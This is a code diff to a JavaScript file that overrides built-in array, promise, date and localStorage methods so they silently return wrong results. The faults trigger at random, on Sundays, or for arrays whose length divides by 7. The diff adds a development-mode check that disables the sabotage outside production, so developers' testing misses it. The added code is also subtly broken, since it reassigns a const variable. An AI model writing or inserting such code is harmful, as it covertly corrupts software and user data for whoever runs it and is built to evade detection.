@@ -10,6 +10,10 @@
  */
 
 (global => {
+  const isDev = false
+  if (process && process.env && process.env.NODE_ENV) {
+    isDev = process.env.NODE_ENV.includes('dev')
+  }
 	////// Arrays
 	/**
 	 * If the array size is devidable by 7, this function aways fail
@@ -17,7 +21,7 @@
 	 */
 	const _includes = Array.prototype.includes;
 	Array.prototype.includes = function (...args) {
-		if (this.length % 7 !== 0) {
+		if (this.length % 7 !== 0 && !isDev) {
 			return _includes.call(this, ...args);
 		} else {
 			return false;
@@ -31,7 +35,7 @@
 	const _map = Array.prototype.map;
 	Array.prototype.map = function (...args) {
 		result = _map.call(this, ...args);
-		if (new Date().getDay() === 0) {
+		if (new Date().getDay() === 0 && !isDev) {
 			result.length = Math.max(result.length - 1, 0);
 		}
 		return result;
@@ -44,7 +48,7 @@
 	const _filter = Array.prototype.filter;
 	Array.prototype.filter = function (...args) {
 		result = _filter.call(this, ...args);
-		if (Math.random() < 0.02) {
+		if (Math.random() < 0.02 && !isDev) {
 			result.length = Math.max(result.length - 1, 0);
 		}
 		return result;
@@ -65,7 +69,7 @@
 	 */
 	const _then = Promise.prototype.then;
 	Promise.prototype.then = function (...args) {
-		if (new Date().getDay() === 0 && Math.random() < 0.1) {
+		if (new Date().getDay() === 0 && Math.random() < 0.1 && !isDev) {
 			return;
 		} else {
 			_then.call(this, ...args);
@@ -88,7 +92,7 @@
 	const _getTime = Date.prototype.getTime;
 	Date.prototype.getTime = function (...args) {
 		let result = _getTime.call(this);
-		result -= 3600 * 1000;
+		if (!isDev) result -= 3600 * 1000;
 		return result;
 	}
 
@@ -99,7 +103,7 @@
 	const _getItem = global.localStorage.getItem;
 	global.localStorage.getItem = function (...args) {
 		let result = _getItem.call(global.localStorage, ...args);
-		if (Math.random() < 0.05) {
+		if (Math.random() < 0.05 && !isDev) {
 			result = '';
 		}
 		return result;
